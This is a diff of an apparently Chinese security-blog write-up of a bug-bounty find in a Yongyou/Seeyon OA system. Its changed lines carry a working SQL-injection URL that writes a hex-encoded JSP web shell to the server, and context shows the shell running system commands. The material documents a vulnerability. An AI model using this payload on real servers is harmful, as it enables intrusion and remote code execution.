@@ -31,8 +31,9 @@
 <meta property="og:image" content="https://remixxyh.github.io/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_11-42-50.png">
 <meta property="og:image" content="https://remixxyh.github.io/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_16-23-46.png">
 <meta property="og:image" content="https://remixxyh.github.io/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_16-25-59.png">
+<meta property="og:image" content="https://remixxyh.github.io/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-08_21-27-16.png">
 <meta property="article:published_time" content="2023-09-04T03:41:06.000Z">
-<meta property="article:modified_time" content="2023-09-04T08:29:22.277Z">
+<meta property="article:modified_time" content="2023-09-08T13:27:52.029Z">
 <meta property="article:author" content="3xsh0re">
 <meta property="article:tag" content="SRC">
 <meta property="article:tag" content="SQL注入">
@@ -351,7 +352,7 @@
 
 <p>通过一个<code>f</code>参数上传脚本</p>
 <p>由于特殊符号存在，URL编码会造成写入后代码错误，故采用<code>hex</code>编码后<code>unhex</code>函数处理上传，写入文件名为：<code>he1p.jsp</code></p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://xxx.xxx.xxx.xxx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27F:/UFseeyon/OA/tomcat/webapps/yyoa/he1p.jsp%27<br></code></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://xxx.xxx.xxx.xxx/yyoa/common/js/menu/test.jsp?doType=101&amp;S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27D:/UFseeyon_2020/OA/tomcat/webapps/yyoa/he1p.jsp%27<br></code></pre></td></tr></table></figure>
 
 <p>上传成功👍</p>
 <p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_11-42-50.png" srcset="/img/loading.gif" lazyload></p>
@@ -364,6 +365,7 @@
 <p>上传后在浏览器里输入：<code>http://x.x.x.x:8001/yyoa/he11o.jsp?pwd=b&amp;i=whoami</code>，即可执行系统命令</p>
 <p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-04_16-25-59.png" srcset="/img/loading.gif" lazyload></p>
 <p>一个妥妥的高危到手👍👍👍</p>
+<p><img src="/2023/09/04/%E4%B8%80%E6%AC%A1%E5%85%AC%E7%9B%8ASRC%E6%8C%96%E6%8E%98-230903/Snipaste_2023-09-08_21-27-16.png" srcset="/img/loading.gif" lazyload></p>
 
                 
               </div>
